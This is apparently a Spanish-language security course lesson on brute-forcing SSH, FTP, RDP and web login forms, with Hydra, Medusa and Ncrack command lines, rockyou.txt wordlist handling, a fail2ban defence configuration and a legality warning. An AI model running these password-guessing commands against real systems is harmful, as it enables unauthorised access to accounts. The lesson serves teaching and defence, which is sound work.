Fuerza bruta aplicada a conexiones

Duración: 5:09 · Sección 2: Temario

La fuerza bruta es una técnica de ataque que consiste en probar todas las combinaciones posibles de contraseñas hasta encontrar la correcta. En el contexto de conexiones remotas (SSH, RDP, FTP), esta técnica se automatiza con herramientas especializadas.

Hydra

Hydra es la herramienta más popular para ataques de fuerza bruta en línea. Soporta múltiples protocolos y es extremadamente rápida. En Ubuntu se instala con sudo apt install hydra.

hydra -l usuario -P wordlist.txt ssh://192.168.1.100

# Especificar un puerto distinto
hydra -l admin -P rockyou.txt ssh://192.168.1.100 -s 2222

# Probar múltiples usuarios con -L
hydra -L users.txt -P passwords.txt ssh://target
💡 La opción -l es para un solo usuario, -L para un archivo de usuarios. Lo mismo aplica para -p (una contraseña) y -P (wordlist).

Hydra también funciona con otros protocolos:

hydra -l admin -P wordlist.txt ftp://192.168.1.100
hydra -l admin -P wordlist.txt rdp://192.168.1.100
hydra -l user -P wordlist.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

Medusa y Ncrack

Alternativas a Hydra con características similares:

# Medusa
medusa -h 192.168.1.100 -u admin -P wordlist.txt -M ssh

# Ncrack (especializado en RDP)
ncrack -u admin -P wordlist.txt rdp://192.168.1.100
HerramientaVentaja principalProtocolos
HydraMás rápida y soporta más protocolosSSH, FTP, HTTP, RDP, MySQL, etc.

Wordlists comunes

Las wordlists son archivos que contienen contraseñas probables. La más famosa es rockyou.txt:

# Ubicación típica en Ubuntu (instalar con: sudo apt install wordlists)
ls -lh /usr/share/wordlists/
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
wc -l /usr/share/wordlists/rockyou.txt
# Salida: 14344392 líneas (~14 millones de contraseñas)

Defensa: fail2ban y rate limiting

Para proteger un servidor SSH contra fuerza bruta:

# Instalar fail2ban
sudo apt install fail2ban -y

# Configurar protección SSH
sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local
sudo nano /etc/fail2ban/jail.local

# Configuración básica para SSH
[sshd]
enabled = true
port = ssh
filter = sshd
maxretry = 5
bantime = 3600
findtime = 600
⚠️ La fuerza bruta es ilegal sin autorización explícita. Solo debe practicarse en entornos controlados como laboratorios propios, máquinas HackTheBox o plataformas similares con consentimiento.
